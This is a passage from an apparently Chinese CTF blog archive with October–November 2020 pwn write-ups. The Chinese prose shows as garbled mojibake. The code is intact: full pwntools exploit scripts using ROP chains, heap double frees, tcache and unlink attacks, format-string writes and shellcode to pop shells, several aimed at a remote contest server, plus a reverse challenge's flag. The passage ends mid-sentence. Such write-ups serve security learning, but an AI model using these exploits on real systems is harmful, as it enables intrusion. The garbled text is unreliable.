‘ï¼Œä¸»è¦åœ¨äºè¯»æ‡‚æ’å…¥å’Œä¸­åºéå†çš„é€»è¾‘ï¼Œ\n\næƒ³äº†å¥½ä¹…ï¼Œå®åœ¨æƒ³ä¸å‡ºè„šæœ¬æ€ä¹ˆå†™ï¼Œå¤ªèœäº†è¿˜æ˜¯æ‰‹æ’•å§\n\nè´´ä¸Šç‚œå“¥çš„æºç \n\n```python\ndef main1():\n\tclass Node:\n\t\tdef __init__(self, data):\n\t\t\tself.left = None #å·¦èŠ‚ç‚¹\n\t\t\tself.right = None #å³èŠ‚ç‚¹\n\t\t\tself.data = data #å€¼\n\t\tdef PrintTree(self):\n\t\t\tif self.left:\n\t\t\t\tself.left.PrintTree()\n\t\t\tprint(chr(self.data),end=\"\")\n\t\t\tif self.right:\n\t\t\t\tself.right.PrintTree()\n\t\tdef insert(self,data):\n\t\t\tif self.data:\n\t\t\t\tif self.left is None:\n\t\t\t\t\tself.left = Node(data)\n\t\t\t\telif self.right is None:\n\t\t\t\t\tself.right = Node(data)\n\t\t\t\telse:\n\t\t\t\t\tself.left.insert(data)\n\t\tdef inorderTraversal(self, root):\n\t\t\tres = []\n\t\t\tif root:\n\t\t\t\tres = self.inorderTraversal(root.left)\n\t\t\t\tres.append(root.data)\n\t\t\t\tres = res + self.inorderTraversal(root.right)\n\t\t\treturn res\n\tstr1=input(\"PLZ input flag:\")\n\t#str1=\"cumtctf{1e70a305fb378202c26dd6dafa14db17}\"\n\tflag=[ord(i) for i in str1]\n\troot = Node(flag[0])\n\tfor i in range(1,len(flag)):\n\t\troot.insert(flag[i])\n\tF=root.inorderTraversal(root)\n\tflag=\"7b}41ada16fdd2d262c70b8533f00ea{7t1tfuccm\"\n\tYES=1\n\tfor i, element in enumerate(F):\n\t\tif ord(flag[i])!=element:\n\t\t\tYES=0\n\t\t\tprint(\"wrong\")\n\t\t\tbreak\n\tif YES:\n\t\tprint(\"wow~you are right!\")\n```\n\n\n\n# 0x09 å°ç»“\n\nåä¸€æœˆæ€»ç»“ï¼šå¤ªèœäº†","tags":["CTF","wp"],"categories":["PWN"]},{"title":"Oct_Match 2020","url":"/2020/10/25/Oct_Match/","content":"\n# 0x00 å‰è¨€\n\nåæœˆå…ˆæ˜¯è¯´èµ°å°±èµ°å»äº†å—äº¬ï¼Œæ‰“äº†å¤©åˆ›æ¯ï¼Œé¢˜ç›®è´¨é‡ä¸€è¨€éš¾å°½\n\nå›æ¥ä¸¤å¤©åˆè¢«å«å»å—é€šå‚åŠ å·¥ä¸šäº’è”ç½‘æ¯”èµ›ï¼Œå’Œ[iluem](https://iluem.xyz/)å’Œ[iyzyi](http://iyzyi.com/)å¸ˆå‚…ä¸€èµ·å¾—äº†ä¸€ç­‰å¥–\n\nå½“å¤©æ™šä¸Šå…«ç‚¹æ‰“åä¸ºæ¯ï¼Œæˆç»©ä¸é”™ç ´äº†ä¸¤ä¸‡åˆ†\n\nå †äº†å¥½å¤šä½œä¸šæ²¡å†™ï¼Œä¹Ÿæ²¡ä»€ä¹ˆæ—¶é—´å¤ç°é¢˜ç›®ï¼Œè´´ä¸‹æ ¡èµ›wpæ°´ä¸€ç¯‡åšå®¢\n\n# 0x01 è¥¿æ¹–è®ºå‰‘2020 mmutag\n\nä¸€é“å †æ ˆç»“åˆçš„é¢˜ç›®ï¼Œ introduceå‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºï¼Œå¯ä»¥å…ˆæ³„éœ²canaryï¼Œç„¶åä¼ªé€ fakechunkï¼Œdouble freeå°†å †åŠ«æŒåˆ°æ ˆä¸Šï¼Œåˆ©ç”¨ROPæ³„éœ²å‡ºlibcåŸºå€ï¼Œæ³„éœ²å‡ºlibcåå°±å¯ä»¥ä¸ºæ‰€æ¬²ä¸ºäº†ï¼Œæœ‰å¤šç§æ€è·¯\n\nè¿™æ˜¯æ­¤æ—¶çš„æ ˆç»“æ„\n\n![image-20201014104706034](https://i.loli.net/2020/10/14/qFdcubhy6HrtQ1f.png)\n\n## exp\n\n1.åˆ©ç”¨ret2csu(æˆ–è€…æ„é€ rop)ï¼Œè°ƒç”¨readå‡½æ•°ï¼Œåˆ©ç”¨ropgetshell\n\n```python\n# encoding=utf-8\nfrom pwn import *\nelf = ELF('./mmutag')\np = elf.process()\n# p = remote('183.129.189.62', 58704)\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\none_gadget = [0x45226, 0x4527a, 0xf0364, 0xf1207]\n\ndef read_introduce1(introduce):\n    p.sendlineafter(\"input your choice:\\n\\n\", \"1\")\n    p.sendafter(\"your introduce \\n\", introduce)\n\ndef introduce():\n    p.sendlineafter(\"input your choice:\\n\\n\", \"2\")\n\ndef add(index, content):\n    p.sendlineafter(\"your choise:\\n\", \"1\")\n    p.sendlineafter(\"your id:\\n\", str(index))\n    p.sendafter(\"your content\\n\", content)\n\ndef delete(index):\n    p.sendlineafter(\"your choise:\\n\", \"2\")\n    p.sendlineafter(\"your id:\\n\", str(index))\n\ndef stack_leak(content):\n    p.sendlineafter(\"your choise:\\n\", \"3\")\n    p.send(content)\n\npoprdi = 0x0000000000400d23\n\np.recvuntil(\"input you name: \\n\")\np.sendline(\"ld1ng\")\np.recvuntil(\"your tag: \")\nstack_address = int(p.recvuntil(\":\", drop=True), 16)\nlog.success(\"stack address {}\".format(hex(stack_address)))\n#read_introduce1(p64(0x71))\nintroduce()\nstack_leak(\"1\"*0x19)\np.recvuntil(\"Your content: \")\np.recvuntil(\"1\"*0x18)\ncanary = u64(p.recv(8)) - ord(\"1\")# leak canary\nlog.success(\"canary {}\".format(hex(canary)))\nstack_leak(p64(0) + p64(0x71) + p64(0)+'\\x00')#build fake chunk , end of canary->00\nadd(1,'ld1ng')\nadd(2,'ld1ng')\ndelete(1)\ndelete(2)\ndelete(1) # double free\nadd(3, p64(stack_address - 0x40))# fd->fake chunk\nadd(5,'ld1ng')\nadd(6,'ld1ng')\n#gdb.attach(p)\npayload = b\"a\"*0x8 + p64(canary)\npayload += p64(stack_address + 0x10)\npayload += p64(poprdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])\npayload += p64(0x400D1C)#__libc_csu_init\npayload += p64(elf.got['read']) + p64(0x80) + p64(stack_address+0x28) + p64(0)\npayload += p64(0x400d00) #ret2csu\nadd(7, payload)\n#gdb.attach(p)\np.sendlineafter(\"your choise:\\n\", \"4\")# trigger bug\n\nlibc.address = u64(p.recvline().strip(b\"\\n\").ljust(8, b\"\\x00\")) - libc.sym['puts']\nlog.success(\"libc address {}\".format(hex(libc.address)))\n# str_sh = libc.search(b\"/bin/sh\\x00\").next()\n# log.success(\"str_bin/sh {}\".format(hex(str_sh)))\n# payload = p64(poprdi) + p64(str_sh)\n# payload += p64(libc.sym['system'])\nonegadget = libc.address + one_gadget[1]\nlog.success(\"one:\" + hex(onegadget))\npayload = p64(onegadget)\np.send(payload)\n# pause()\np.interactive()\n\n```\n\n2.è€æ–¹æ³•ï¼Œåˆ©ç”¨malloc_hookå’Œrealloc_hook\n\n```python\nlibc_base = u64(p.recv(6).ljust(8,'\\x00')) - 240 - libc.sym['__libc_start_main']\nlog.info(\"LIBC:\\t\"+ hex(libc_base))\nfree(2)\nfree(1)\nfree(2)\nrce = libc_base + 0x4527A\nrealloc = libc_base + libc.sym['realloc']\nmalloc_hook = libc_base + libc.sym['__malloc_hook']\nnew(7,p64(malloc_hook - 0x23))\nnew(8,\"UUUU\")\nnew(9,'UUUU')\nnew(10,'\\x00'*(0x13 - 8) + p64(rce) + p64(realloc + 4))\nfree(1)\nfree(1)\np.interactive()\n```\n\n3.ä¸¤æ¬¡double free ä¸¤æ¬¡rop\n\n```python\n#leak libc_base\nputs_addr=u64(sh.recvuntil(\"\\x7f\")[-6:].ljust(8,\"\\x00\"))\nlibc_base=puts_addr-libc.symbols[\"puts\"]\nsystem_addr=libc_base+libc.symbols[\"system\"]\nbinsh=libc_base+libc.search(\"/bin/sh\").next()\ninfo(\"libc_base:0x%x\",libc_base)\n\n#try again\nsh.recvuntil(\"please input your choise:\")\nsh.sendline(\"3\")\npayload=p64(0)+p64(0x71)\nsh.sendline(payload)\ndelete(1)\ndelete(2)\ndelete(1)\npayload=p64(stack_addr-0x20)\nadd(7,payload)\nadd(8,'cccc')\nadd(9,'dddd')\npayload=\"a\"*8+p64(canary)\npayload+=\"b\"*8+p64(poprdi)+p64(binsh)\npayload+=p64(system_addr)+p64(main)\nadd(10,payload)\nsh.recvuntil(\"please input your choise:\")\nsh.sendline(\"4\")\nsh.interactive()\n```\n\n4.ï§ç”¨readè¦†ç›–atoi@GOT\n\nå› æ­¤ROPé“¾ä¸ºï¼š \n\nputs(puts@GOT)æ³„ï¤¸libcåœ°å€ \n\nread(0, atoi@GOT, ...)åŠ«æŒGOT \n\nè¿”å›åˆ°ReadIntè§¦å‘system\n\n```python\nexp = p64(0) #fd\nexp+= p64(canary)\nexp+= p64(buf)\nexp+= p64(elf.got['puts'])\nexp+= p64(elf.plt['puts']) #puts(puts@GOT)\nexp+= p64(0x400d23) #pop rdi ; ret\nexp+= p64(0) #STDIN\nexp+= p64(0x400d21) #pop rsi ; pop r15 ; ret\nexp+= p64(elf.got['atoi'])\nexp+= p64(0)\nexp+= p64(elf.plt['read']) #read(STDIN, atoi@GOT, ...)\nexp+= p64(0x400942) # Read option\nAdd(6, exp)\nLeave() #trigger\nputs_addr = u64(sh.recv(6).ljust(8, '\\x00'))\nlibc.address = puts_addr - libc.symbols['puts']\nlog.success('libc base = '+hex(libc.address))\nsh.send(p64(libc.symbols['system'])) #atoi@GOT = system@LIBC\nsh.sendline('/bin/sh')\nsh.interactive()\n```\n\n...ä½ å­¦åºŸäº†å—\n\n\n\n# 0x02 N1CTF2020 Signin\n\nc++å®Œå…¨è¯»ä¸æ‡‚ï¼Œå…¨é åŠ¨è°ƒåˆ†æç¨‹åºï¼Œç”¨çš„vector\n\nbssæ®µå‚¨å­˜å†…å­˜å— 1 2 ä¿¡æ¯çš„3ä¸ªæŒ‡é’ˆ\n\næŒ‡é’ˆ1å’Œ3æ˜¯ä¸€ä¸ªè¾¹ç•ŒæŒ‡é’ˆï¼ŒæŒ‡é’ˆ2æ˜¯æ•°æ®ç¼–è¾‘æŒ‡é’ˆã€‚æ ¹æ®æŒ‡é’ˆ2å¤„æ¥å†™numberæ•°æ®ã€‚\n\nå½“æŒ‡é’ˆ2å¤§å°è¶…è¿‡æŒ‡é’ˆ3ï¼Œå…¶å°±ä¼šç”³è¯·ä¸€å—æ–°çš„å†…å­˜ï¼Œå…¶ç”³è¯·å®Œå†…å­˜å¤§å°æ˜¯ä»¥`0x20,0x20,0x30,0x50,0x90,0x110,0x210,0x410,0x810,0x1010` è¿™æ ·é€’å¢ã€‚\n\nç”³è¯·å®Œæ–°å†…å­˜ï¼Œä¼šæŠŠä¸Šä¸€å—chunk freeï¼Œå¹¶æŠŠä¸Šä¸€å—å†…å­˜ä¸­çš„numberå€¼è¿›è¡Œæ‹·è´åˆ°æ–°ç”³è¯·çš„å†…å­˜ä¸­ã€‚å¹¶ä¸”ä¼šæ ¹æ®ç”³è¯·åˆ°çš„chunkåœ°å€ï¼Œè¿›è¡Œå¯¹bssæ®µ3ä¸ªæŒ‡é’ˆçš„æ›´æ–°\n\n## exp\n\næ€è·¯addå¤šæ¬¡ç»•è¿‡tcacheï¼Œé€šè¿‡unsortedbinæ³„éœ²libcåŸºå€\n\næœ€åæ¥ç€freeï¼Œè®©æŒ‡é’ˆ2æŒ‡å‘0x20çš„fdå¤„ï¼Œä¿®æ”¹å…¶ä¸ºfree hook ï¼Œå¹¶æ”¹ä¸ºsystemï¼Œå†æ¬¡freeè§¦å‘æ¼æ´\n\n```python\nfrom pwn import *\ns = process(\"./signin\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\ndef add(idx,num):\n\ts.sendlineafter(\">>\",\"1\")\n\ts.sendlineafter(\"Index:\",str(idx))\n\ts.sendlineafter(\"Number:\",str(num))\ndef free(idx):\n\ts.sendlineafter(\">>\",\"2\")\n\ts.sendlineafter(\"Index:\",str(idx))\ndef show(idx):\n\ts.sendlineafter(\">>\",\"3\")\n\ts.sendlineafter(\"Index:\",str(idx))\nfor i in range(0x101):\n\tadd(1,1)\nfor i in range(0x202):\n\tfree(1)\nshow(1)\nlibc_base = int(s.recv(15),10)- 0x70 - libc.sym['__malloc_hook']\ninfo(hex(libc_base))\nfree_hook = libc.sym['__free_hook'] + libc_base\nsystem = libc_base + libc.sym['system']\ninfo(hex(system))\nfor i in range(0x10d):\n\tfree(1)\nshow(1)\nadd(1,free_hook-0x8)\nadd(2,u64(\"/bin/sh\\x00\"))\nadd(2,system)\ns.interactive()\n```\n\n# 0x03 CUMTCTF \n\næˆ‘ä¹ æƒ¯æ¯æ¬¡éƒ½ç”¨ubuntu16.4åœ¨æœ¬åœ°åšï¼Œæ¯”èµ›libcæ˜¯2.27ï¼Œå¾€å¾€éœ€è¦å¤§æ”¹ï¼Œæ ¡èµ›é¢˜ç›®æ”¹expæ¯”å†™çš„æ—¶é—´è¿˜é•¿ï¼ï¿£ã¸ï¿£\n\n## 0x00 login\n\nè¿œç¨‹è¿æ¥è¶…æ—¶ï¼Œå¯èƒ½æ˜¯systemæ²¡å¯¹é½çš„åŸå› ï¼Œå½“æ—¶æ²¡è€ƒè™‘å¤ªå¤šç›´æ¥é‡‡ç”¨è ¢æ¯”å†™æ³•ã€‚ã€‚\n\n```python\nfrom pwn import *\nelf = ELF('./login')\n#p = elf.process()\n#context.log_level = 'debug'\np = remote('219.219.61.234', 10000)\nsys = 0x4006F0\nbssaddr = elf.bss()\np.recvuntil(\"choice:\")\np.sendline('1')\np.recvuntil(\"username\")\np.sendline('cat flag')\np.recvuntil(\"password\")\npayload = 'a'*0x40 + 'b'*0x8 + p64(0x400be3) + p64(0) + p64(0x400be1) + p64(bssaddr) + p64(0) + p64(elf.sym['read']) + p64(0x400A36)\np.sendline(payload)\np.sendline('cat flag')\np.recvuntil(\"username(length less than 20):\")\np.sendline('123456')\np.recvuntil(\"password(length less than 20):\")\npayload = 'a'*0x40 + 'b'*0x8  + p64(0x400be3) + p64(bssaddr) + p64(sys) + p64(0x0400AF9)\np.sendline(payload)\n#pause()\np.interactive()\n\n```\n\n## 0x01 login_plus\n\nlonglongå‹(64ä½)å’Œintå‹(32ä½)ï¼Œæ•´æ•°æº¢å‡º\n\n```python\nfrom pwn import *\nelf = ELF('./login')\n#p = elf.process()\n#context.log_level = 'debug'\np = remote('219.219.61.234', 10001)\nsys = 0x4006F0\nbssaddr = elf.bss()\np.recvuntil(\"choice:\")\np.sendline('1')\np.recvuntil('Enter your id!')\npayload = pow(2,32)\nprint payload\np.sendline('4294967296')\n# p.recvuntil('Enter your id!')\n# p.sendline('0')\n# p.recvuntil(\"username(length less than 20)\")\n# p.send('test')\n# p.recvuntil(\"password(length less than 20)\")\n# gdb.attach(p)\n# p.send('a'*0x18 + p64(0x6011D0))\n# p.send('test')\n\np.interactive()\n```\n\n## 0x02 not_implemented_login_service\n\nbssæ®µå†™shellcodeï¼Œret2bss\n\nROPçš„æ–¹æ³•æ‰“ä¸é€šä¸æ˜åŸå› ...\n\n```python\nfrom pwn import *\nelf = ELF('./login''')\n#p = elf.process()\np = remote('219.219.61.234',10004)\n#context.log_level = 'debug'\ncontext(arch = 'amd64',os = 'linux')\n#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\nlibc = ELF('libc-2.27.so')\nshellcode = asm(shellcraft.sh())\naddr = 0x601060\np.recvuntil(\"username:\")\np.sendline(shellcode)\npayload='pwnht'.ljust(0x10,'\\x00') + 'b'*8 + p64(addr)\n#p.recvuntil('password:')\np.sendline(payload)\np.interactive()\n```\n\n## 0x03 note_service\n\næ³„éœ²libcåŸºå€ï¼Œæ ˆåœ°å€å’Œè¿”å›åœ°å€ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„åœ°å€å†™\n\n```python\nfrom pwn import *\nelf = ELF('./note_service')\ncontext(arch='amd64',os='linux')\n#p = elf.process()\ncontext.log_level = 'debug'\np = remote('219.219.61.234', 10002)\nlibc = ELF('libc-2.27.so')\nonegadget = [0x4f2c5, 0x4f322,0x10a38c,0xf1207]\ndef leak(con):\n    p.recvuntil('input your note:')\n    p.sendline(str(con))\n    p.recvuntil(\"is:\")\n    mm = int(p.recvuntil(\"-\").strip('-'),16)\n    p.recvuntil('????')\n    p.sendline('123')\n    return mm\np.recvuntil('input your name:')\np.sendline('ld1ng')\nstack = leak(\"%38$p-\") - 0xd8\ninfo(\"libc + 240:\" + hex(stack))\ncanary = leak('%39$p-')\ninfo(\"canary:\" + hex(canary))\nlibc_base = leak('%41$p-') - 231 -libc.sym['__libc_start_main']\ninfo(\"libc_base:\" + hex(libc_base))\none_gadget = libc_base + onegadget[0]\npayload = fmtstr_payload(6,{stack:one_gadget})\np.recvuntil('note:')\np.sendline(payload)\np.recv()\np.recvuntil('????')\np.sendline('yes')\n#gdb.attach(p)\np.interactive()\n\n```\n\n## 0x04 messagesystem\n\ntcache + unlinkï¼Œæ”¹å†™free_gotä¸ºsystem\n\nå“‡ubuntu16.4åšå‡ºæ¥ä¹‹åæ‰å¾—çŸ¥æ˜¯libc2.27ï¼Œæ”¹äº†å¥½ä¹…\n\n```python\n#coding=utf-8\nfrom pwn import *\n#context.log_level='debug'\n#sh=process(\"./messagesystem\")\ncontext(arch='amd64',os='linux')\nsh = remote('219.219.61.234', 10003)\nlibc=ELF(\"libc-2.27.so\")\n#libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n#og = [0x4f2c5,0x4f322,0x10a38c]\ndef add(idx,size,content):\n    sh.recvuntil(\"choice:\")\n    sh.sendline(str(1))\n    sh.recvuntil('Now Leave Message!')\n    sh.sendline(str(idx))\n    sh.recvuntil(\"want to leave?\")\n    sh.sendline(str(size))\n    sh.recvuntil(\"want to say?\")\n    sh.send(content)\n\ndef edit(idx,content):\n\tsh.recvuntil(\"choice:\")\n\tsh.sendline(str(4))\n\tsh.recvuntil(\"want to edit?\")\n\tsh.sendline(str(idx))\n\tsh.recvuntil(\"enter your Message!\")\n\tsh.send(content)\n\ndef show(idx):\n\tsh.recvuntil(\"choice:\")\n\tsh.sendline(str(2))\n\tsh.recvuntil(\"want to show?\")\n\tsh.sendline(str(idx))\n\ndef delete(idx):\n\tsh.recvuntil(\"choice: \")\n\tsh.sendline(str(3))\n\tsh.recvuntil(\"want to delete?\")\n\tsh.sendline(str(idx))\n\nadd(0,136,'a'*16)\nadd(1,136,'b'*8)\nadd(2,136,'c'*8)\nadd(3,136,'/bin/sh')\nadd(4,136,'e'*8)\nadd(5,136,'a')\nadd(6,136,'a')\nadd(7,136,'a')\nadd(8,136,'a')\nadd(9,136,'a')\nadd(10,136,'a')\nadd(11,136,'a')\ndelete(0)\ndelete(1)\ndelete(2)\ndelete(3)\ndelete(4)\ndelete(5)\ndelete(6)\ndelete(7)\nadd(7,130,p8(0xa0))\nadd(6,130,p8(0xa0))\nadd(5,130,p8(0xa0))\nadd(4,130,p8(0xa0))\nadd(3,130,'cat flag')\nadd(2,130,p8(0xa0))\nadd(1,130,p8(0xa0))\nadd(0,130,p8(0xa0))\nshow(0)\nsh.recv()\n# uu64(sh.recv(6))\n#libc_base = u64(sh.recv(7).ljust(8,'\\x00'))-0x70-libc.sym['__malloc_hook']\nlibc_base = u64(sh.recvuntil('\\x7f')[-6:] + '\\x00\\x00')-0x70-libc.sym['__malloc_hook']\ninfo(\"libc_base:\" + hex(libc_base))\n\ndelete(5)\ndelete(6)\ndelete(7)\ndelete(8)\ndelete(9)\ndelete(10)\ndelete(11)\npayload = p64(0)+p64(8)+p64(0x601568-0x8*3) + p64(0x601568-0x8*2)+ 0x60*'A'\npayload += p64(0x80)+ p64(0x90)\ndelete(1)\n\nadd(11,130,'e'*8)\nadd(10,130,'a')\nadd(9,130,'a')\nadd(8,130,'a')\nadd(7,130,'a')\nadd(6,130,'a')\nadd(5,130,'a')\nadd(1,130,payload)\ndelete(5)\ndelete(6)\ndelete(7)\ndelete(8)\ndelete(9)\ndelete(10)\ndelete(11)\ndelete(2)\npayload = 'a'*0x10 + p64(0x601480)\nedit(1,payload)\n#\n#onegadget = libc_base + og[3]\nsystem0 = libc_base + libc.sym['system']\ninfo(hex(system0))\n#info(hex(onegadget))\n\nedit(0,p64(system0))\n#gdb.attach(sh)\ndelete(3)\n#\nsh.interactive()\n```\n\n## 0x05 messagesystem_plus\n\né˜¿è¿™ã€‚ã€‚æ„Ÿè§‰æ˜¯éé¢„æœŸï¼ŒåŒæ ·çš„è„šæœ¬ç¨å¾®æ”¹ä¸€æ”¹å°±èƒ½ç”¨\n\n```python\n#coding=utf-8\nfrom pwn import *\n#context.log_level='debug'\nsh=process(\"./messageSystem_plus\")\n#sh = remote('219.219.61.234', 10005)\nlibc=ELF(\"libc-2.27.so\")\n#libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n#og = [0x4f2c5,0x4f322,0x10a38c,0xf1207]\n#og = [0x4f2c5,0x4f322,0x10a38c]\ndef add(idx,size,content):\n    sh.recvuntil(\"choice:\")\n    sh.sendline(str(1))\n    sh.recvuntil('Now Leave Message!')\n    sh.sendline(str(idx))\n    sh.recvuntil(\"want to leave?\")\n    sh.sendline(str(size))\n    sh.recvuntil(\"want to say?\")\n    sh.send(content)\n\ndef edit(idx,content):\n\tsh.recvuntil(\"choice:\")\n\tsh.sendline(str(4))\n\tsh.recvuntil(\"want to edit?\")\n\tsh.sendline(str(idx))\n\tsh.recvuntil(\"enter your Message!\")\n\tsh.send(content)\n\ndef show(idx):\n\tsh.recvuntil(\"choice:\")\n\tsh.sendline(str(2))\n\tsh.recvuntil(\"want to show?\")\n\tsh.sendline(str(idx))\n\ndef delete(idx):\n    sh.recvuntil(\"choice: \")\n    sh.sendline(str(3))\n    sh.recvuntil(\"Single Message\")\n    sh.sendline(str(2))\n    sh.recvuntil(\"you want to delete?\")\n    sh.sendline(str(idx))\n\nadd(0,136,'a'*16)\nadd(1,136,'b'*8)\nadd(2,136,'c'*8)\nadd(3,136,'/bin/sh')\nadd(4,136,'e'*8)\nadd(5,136,'a')\nadd(6,136,'a')\nadd(7,136,'a')\nadd(8,136,'a')\nadd(9,136,'a')\nadd(10,136,'a')\nadd(11,136,'a')\ndelete(0)\ndelete(1)\ndelete(2)\ndelete(3)\ndelete(4)\ndelete(5)\ndelete(6)\ndelete(7)\nadd(7,130,p8(0xa0))\nadd(6,130,p8(0xa0))\nadd(5,130,p8(0xa0))\nadd(4,130,p8(0xa0))\nadd(3,130,'cat flag')\nadd(2,130,p8(0xa0))\nadd(1,130,p8(0xa0))\nadd(0,130,p8(0xa0))\n\nshow(0)\nsh.recv()\n# uu64(sh.recv(6))\n#libc_base = u64(sh.recv(7).ljust(8,'\\x00'))-0x70-libc.sym['__malloc_hook']\nlibc_base = u64(sh.recvuntil('\\x7f')[-6:] + '\\x00\\x00')-0x70-libc.sym['__malloc_hook']\ninfo(\"libc_base:\" + hex(libc_base))\n#gdb.attach(sh)\ndelete(5)\ndelete(6)\ndelete(7)\ndelete(8)\ndelete(9)\ndelete(10)\ndelete(11)\npayload = p64(0)+p64(8)+p64(0x6017a8-0x8*3) + p64(0x6017a8-0x8*2)+ 0x60*'A'\npayload += p64(0x80)+ p64(0x90)\ndelete(1)\n\nadd(11,130,'e'*8)\nadd(10,130,'a')\nadd(9,130,'a')\nadd(8,130,'a')\nadd(7,130,'a')\nadd(6,130,'a')\nadd(5,130,'a')\nadd(1,130,payload)\n#gdb.attach(sh)\ndelete(5)\ndelete(6)\ndelete(7)\ndelete(8)\ndelete(9)\ndelete(10)\ndelete(11)\ndelete(2)\npayload = 'a'*0x10 + p64(0x6016a8)#free_go\nedit(1,payload)\n#onegadget = libc_base + og[1]\nsystem0 = libc_base + libc.sym['system']\ninfo(hex(system0))\n#info(hex(onegadget))\n\nedit(0,p64(system0))\n#gdb.attach(sh)\ndelete(3)\n#\nsh.interactive()\n```\n\n## 0x06 mail_service\n\ntcache + uaf ï¼ŒåŠ«æŒfree_hookä¸ºonegadget\n\n```python\nfrom pwn import *\n# context(arch='amd64',os='linux')\n# context.log_level='debug'\n#sh=process(\"./mail_service\")\nsh = remote('219.219.61.234', 10006)\nlibc=ELF(\"libc-2.27.so\")\n# libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\nog = [0x4f2c5,0x4f322,0x10a38c]\ndef reg():\n    sh.recvuntil(\"your choice:\")\n    sh.sendline(str(1))\n    sh.recvuntil(\"input your name:\")\n    sh.sendline('ld1ng')\n    sh.recvuntil(\"input your password:\")\n    sh.sendline('123')\n\ndef login():\n    sh.recvuntil(\"your choice:\")\n    sh.sendline(str(2))\n    sh.recvuntil(\"input your name:\")\n    sh.sendline('ld1ng')\n    sh.recvuntil(\"input your password:\")\n    sh.sendline('123')\n\ndef add(idx,size,content):\n    sh.recvuntil(\"choice:\")\n    sh.sendline(str(1))\n    sh.recvuntil('your mail index:')\n    sh.sendline(str(idx))\n    sh.recvuntil('input your receiver:')\n    sh.sendline('')\n    sh.recvuntil('input your title:')\n    sh.sendline('')\n    sh.recvuntil(\"input your mail length:\")\n    sh.sendline(str(size))\n    sh.recvuntil(\"input your mail context:\")\n    sh.send(content)\n\ndef edit(idx,content):\n    sh.recvuntil(\"choice:\")\n    sh.sendline(str(4))\n    sh.recvuntil(\"your mail index:\")\n    sh.sendline(str(idx))\n    sh.recvuntil('input your receiver:')\n    sh.sendline('')\n    sh.recvuntil('input your title:')\n    sh.sendline('')\n    sh.recvuntil(\"input your mail context:\")\n    sh.send(content)\n\ndef show(idx):\n\tsh.recvuntil(\"choice:\")\n\tsh.sendline(str(2))\n\tsh.recvuntil(\"your mail index:\")\n\tsh.sendline(str(idx))\n\ndef delete(idx):\n\tsh.recvuntil(\"choice:\")\n\tsh.sendline(str(3))\n\tsh.recvuntil(\"your mail index:\")\n\tsh.sendline(str(idx))\n\nreg()\nlogin()\nfor i in range(10):\n    add(i,144,'aaa')\nfor i in range(7):\n    delete(i)\ndelete(7)\nfor i in range(6,-1,-1):\n    add(i,144,'aaa')\nadd(7,144,'a'*8)\nshow(7)\nsh.recvuntil('a'*8)\nlibc_base = u64(sh.recvuntil('\\x7f')[-6:] + '\\x00\\x00')-0x70-libc.sym['__malloc_hook']\ninfo(hex(libc_base))\nonegadget = libc_base + og[1]\ninfo(hex(onegadget))\nmalloc_hook = libc_base + libc.sym['__malloc_hook']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem = libc_base + libc.sym['system']\ninfo(hex(free_hook))\nfake_chunk = malloc_hook - 0x23\n#payload = '\\x00'*(0x23-8) + p64(onegadget)\ninfo(hex(fake_chunk))\ndelete(1)\ndelete(0)\nedit(0, p64(free_hook)+p64(free_hook))\nedit(2,'cat flag')\nadd(12, 144, 'A'*0x10)\nadd(13,140,p64(onegadget))\ndelete(2)\n#gdb.attach(sh,\"b *$rebase(0x202060)\")\nsh.interactive()\n```\n\n## 0x07 safe_vpn\n\nçœŸéé¢„æœŸï¼Œå­¦é•¿è¯´ç¯å¢ƒæ²¡é…å¥½ï¼Œåªè¦æœ‰äººncï¼Œadmin.txtå°±è‡ªåŠ¨æ¸…ç©ºï¼Œä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› \n\nç™½ç»™é¢˜\n\n```python\nfrom pwn import *\nelf  = ELF('./vpn')\n#context.log_level = 'debug'\n#io = process(local_file)\nio = remote('219.219.61.234', 20007)\nlibc = ELF('libc-2.27.so')\ncontext.arch = elf.arch\nio.sendafter('name','\\x00')\nio.sendafter('password','\\x00')\nio.interactive()\n```\n\n\n\n# 0x04 å°ç»“\n\nåæœˆæ€»ç»“ï¼šå¤ªèœäº†...","tags":["CTF","wp"],"categories":["PWN"]},{"title":"Pwnableéƒ¨åˆ†wp","url":"/2020/10/25/Pwnable/","content":"\n# å‰è¨€\n\nè¿™æ˜¯å¾ˆä¹…ä»¥å‰è¾¹åšè¾¹è®°çš„å­¦ä¹ è®°å½•\npwnableé¢˜ç›®è´¨é‡å¾ˆé«˜ï¼Œå€¼å¾—è®¤çœŸå­¦ä¹ å’Œç ”ç©¶ä¸€ä¸‹\n\n## 0x01 Start\n\n```c\nstart: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped\n//32ä½ç¨‹åºï¼Œé™æ€ç¼–è¯‘\n```\n\nç¨‹åºåªæœ‰è¿™å‡ è¡Œæ±‡ç¼–ï¼ŒåŠ ä¸Šæ³¨é‡Šæ–¹ä¾¿ç†è§£\n\n```assembly\npush    esp\npush    offset _exit\nxor     eax, eax\nxor     ebx, ebx\nxor     ecx, ecx\nxor     edx, edx\npush    3A465443h       ;\"CTF:\"\npush    20656874h       ;\"the \"\npush    20747261h       ;\"art \"\npush    74732073h       ;\"s st\"\npush    2774654Ch       ;\"Let'\"\nmov     ecx, esp        ; addr\nmov     dl, 14h         ; len\nmov     bl, 1           ; fd\nmov     al, 4\nint     80h             ; sys_write\nxor     ebx, ebx\nmov     dl, 3Ch\nmov     al, 3\nint     80h             ; sys_read\nadd     esp, 14h\nretn\n```\n\nç®€å•çš„ç³»ç»Ÿè°ƒç”¨ï¼Œwriteå’Œread\nç”±äºç¨‹åºå¾ˆç®€å•ï¼Œå¯ä»¥gdbåŠ¨è°ƒç†è§£é€»è¾‘ (å¾ˆé‡è¦)\nå…³é”®ç‚¹åœ¨æœ€åçš„`add   esp, 14h  ;  